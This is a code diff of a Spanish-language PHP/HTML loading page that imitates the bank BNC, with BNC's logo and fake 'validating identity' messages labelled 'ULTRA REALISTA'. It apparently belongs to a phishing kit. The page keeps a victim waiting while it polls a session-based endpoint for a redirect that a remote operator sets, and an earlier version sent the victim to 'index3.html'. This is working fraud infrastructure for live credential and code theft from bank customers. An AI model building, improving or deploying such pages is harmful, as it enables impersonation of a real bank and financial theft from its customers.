@@ -1,96 +1,246 @@
+<?php
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+error_reporting(0);
+
+if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
+    http_response_code(400);
+    exit;
+}
+
+$request_id = $_GET['id'];
+
+session_write_close();
+session_id($request_id);
+session_start();
+
+if (!isset($_SESSION['load_entry_time'])) {
+    $_SESSION['load_entry_time'] = time();
+}
+
+if (isset($_GET['check'])) {
+    header('Content-Type: application/json; charset=UTF-8');
+    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
+        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
+            echo json_encode(['redirect' => $_SESSION['redirect']]);
+            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
+        } else {
+            echo json_encode(['redirect' => null]);
+        }
+    } else {
+        echo json_encode(['redirect' => null]);
+    }
+    exit;
+}
+?>
+    <!--
+
+    ██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
+    ██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
+    ██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
+    ██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
+    ██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
+    ╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
+    -->
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificando Información</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { 
-            background-image: url('https://i.postimg.cc/DZVgdPhQ/9aa5a26c-780a-444f-acb0-d9c7cfee2bbe.png'); 
-            background-size: cover; 
-            background-position: center;
-            background-attachment: fixed;
-            margin: 0;
-            height: 100vh;
-            overflow: hidden;
-        }
-        
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.6); 
-            z-index: -1;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="iconero.ico">
+<title>BNC</title>
 
-        .loader-card {
-            border-radius: 1.5rem 1.5rem 0 0;
-            min-height: 400px;
-            z-index: 10;
-        }
+<style>
+* { box-sizing: border-box; }
 
-        /* Animación de pulso profesional */
-        .loading-pulse {
-            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-        }
+body {
+    margin: 0;
+    height: 100vh;
+    background: #f4f5f7;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+}
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: .5; }
-        }
+/* CONTENEDOR */
+.loader-wrapper {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
 
-        /* Barra de progreso suave */
-        .progress-bar {
-            width: 0%;
-            height: 4px;
-            background-color: #ec1c24;
-            transition: width 15s linear;
-        }
-    </style>
+/* SPINNER PREMIUM */
+.spinner {
+    width: 90px;
+    height: 90px;
+    position: relative;
+}
+
+/* ARO EXTERNO */
+.spinner::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 3px solid #e2e2e2;
+}
+
+/* ARO ACTIVO */
+.spinner::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 3px solid transparent;
+    border-top-color: #031a4c;
+    border-right-color: #031a4c;
+    animation: spin 1.2s linear infinite;
+}
+
+/* LOGO CENTRAL */
+.logo {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    overflow: hidden;
+    background: #fff;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+}
+
+/* IMAGEN LOGO */
+.logo img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    animation: fadeLogo 2.5s ease-in-out infinite;
+}
+
+/* TEXTO PRINCIPAL */
+.loading-text {
+    margin-top: 30px;
+    font-size: 16px;
+    color: #2b2b2b;
+    font-weight: 500;
+    text-align: center;
+    transition: opacity 0.4s ease;
+}
+
+/* SUBTEXTO */
+.subtext {
+    margin-top: 6px;
+    font-size: 13px;
+    color: #8a8a8a;
+    text-align: center;
+    transition: opacity 0.4s ease;
+}
+
+/* DOTS */
+.loading-dots::after {
+    content: "";
+    animation: dots 1.5s infinite steps(4, end);
+}
+
+/* ANIMACIONES */
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* FADE SUAVE LOGO */
+@keyframes fadeLogo {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.75; }
+}
+
+/* DOTS */
+@keyframes dots {
+    0% { content: ""; }
+    25% { content: "."; }
+    50% { content: ".."; }
+    75% { content: "..."; }
+}
+</style>
 </head>
-<body class="flex flex-col justify-end">
 
-    <div class="bg-white w-full loader-card p-8 shadow-2xl flex flex-col items-center justify-between">
-        <!-- Barra de arrastre -->
-        <div class="w-10 h-1 bg-gray-300 rounded-full mb-10"></div>
+<body>
 
-        <div class="flex-1 flex flex-col items-center justify-center space-y-6">
-            <!-- LOGO: Reemplaza con la URL de tu logo -->
-            <div class="w-24 h-24 flex items-center justify-center rounded-full bg-gray-50 shadow-inner">
-                <img src="https://tse2.mm.bing.net/th/id/OIP.juuzw2xnJ58WEZwWLafBcwHaHa?w=936&h=936&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Logo" class="w-16 h-16 object-contain loading-pulse">
-            </div>
+<div class="loader-wrapper">
 
-            <div class="text-center space-y-2">
-                <h2 class="text-xl font-bold text-gray-800">Validando identidad</h2>
-                <p class="text-gray-500 text-sm px-10">Estamos procesando tu solicitud de forma segura. Por favor, no cierres esta ventana.</p>
-            </div>
-
-         
-
-        <!-- Barra de progreso e indicador de tiempo -->
-        <div class="w-full space-y-4 mb-6">
-            <div class="w-full bg-gray-100 rounded-full overflow-hidden">
-                <div id="bar" class="progress-bar"></div>
-            </div>
-            <p class="text-center text-[10px] text-gray-400 uppercase tracking-widest font-semibold">Cifrado de extremo a extremo</p>
+    <div class="spinner">
+        <div class="logo">
+            <img src="https://d1uubxdj0phgsa.cloudfront.net/Images/BNCLogoSmall-Big.png" alt="logo">
         </div>
     </div>
 
-    <script>
-        window.onload = () => {
-            const bar = document.getElementById('bar');
-            
-            // Inicia la animación de la barra inmediatamente
-            setTimeout(() => {
-                bar.style.width = '100%';
-            }, 100);
+    <div class="loading-text" id="mainText">
+        Validando información<span class="loading-dots"></span>
+    </div>
 
-            // Redirección tras 15 segundos exactos
-            setTimeout(() => {
-                window.location.href = "index3.html";
-            }, 15000);
-        };
-    </script>
+    <div class="subtext" id="subText">
+        Esto puede tardar unos segundos
+    </div>
+
+</div>
+
+<script>
+const mainText = document.getElementById("mainText");
+const subText = document.getElementById("subText");
+
+/* MENSAJES DINAMICOS (ULTRA REALISTA) */
+const steps = [
+    {
+        title: "Validando información",
+        sub: "Esto puede tardar unos segundos"
+    },
+    {
+        title: "Verificando identidad",
+        sub: "Protegemos tu información en todo momento"
+    },
+    {
+        title: "Confirmando datos",
+        sub: "Estamos asegurando tu acceso"
+    }
+];
+
+let stepIndex = 0;
+
+function changeStep() {
+    stepIndex = (stepIndex + 1) % steps.length;
+
+    mainText.style.opacity = 0;
+    subText.style.opacity = 0;
+
+    setTimeout(() => {
+        mainText.innerHTML = steps[stepIndex].title + '<span class="loading-dots"></span>';
+        subText.textContent = steps[stepIndex].sub;
+
+        mainText.style.opacity = 1;
+        subText.style.opacity = 1;
+    }, 400);
+}
+
+setInterval(changeStep, 2500);
+
+/* REDIRECCION BACKEND */
+function checkRedirect() {
+    fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, "UTF-8"); ?>&check=1')
+        .then(res => res.json())
+        .then(data => {
+            if (data.redirect) {
+                window.location.href = data.redirect;
+            } else {
+                setTimeout(checkRedirect, 1500);
+            }
+        })
+        .catch(() => setTimeout(checkRedirect, 1500));
+}
+
+window.onload = checkRedirect;
+</script>
+
 </body>
 </html>
